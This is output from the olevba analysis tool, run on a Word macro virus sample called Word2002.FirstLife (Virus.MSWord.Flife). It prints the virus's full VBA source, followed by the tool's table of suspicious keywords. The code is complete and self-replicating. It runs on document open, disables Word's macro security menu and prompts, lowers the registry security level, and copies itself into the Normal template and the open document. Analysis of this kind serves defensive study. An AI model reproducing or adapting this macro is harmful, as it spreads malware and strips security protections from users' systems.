olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Flife
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Flife - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()
On Error Resume Next
'Word2002.FirstLife
Options.ConfirmConversions = (1 - 1)
Options.SaveNormalPrompt = (1 - 1)
If Application.Version = "10.0" Then
MsgBox "10"
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
Application.AutomationSecurity = msoAutomationSecurityForceDisable
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
End If
End If
If Application.Version = "9.0" Then
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
CommandBars("Tools").Controls("Macro").Enabled = False
End If
End If
TD = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
If NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(3, 1) <> "'Word2002.FirstLife" Then
Set NT = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
NT.DeleteLines 1, NT.CountOfLines
NT.AddFromString TD
NT.ReplaceLine 1, "Sub Document_Close()"
End If
If ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(3, 1) <> "'Word2002.FirstLife" Then
Set VA = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
VA.DeleteLines 1, VA.CountOfLines
VA.AddFromString TD
VA.ReplaceLine 1, "Sub Document_Open()"
End If
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub

' Word2002.FirstLife by ULTRAS [MATRiX]
' The first virus for Word 2002!
' Date: mar 21th 2001
' MATRiX TeAm:
' ANAKToS, Del_Armg0, NBK, mort, SnakeByte, pointbat, ULTRAS
' new technology, new vx power...
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

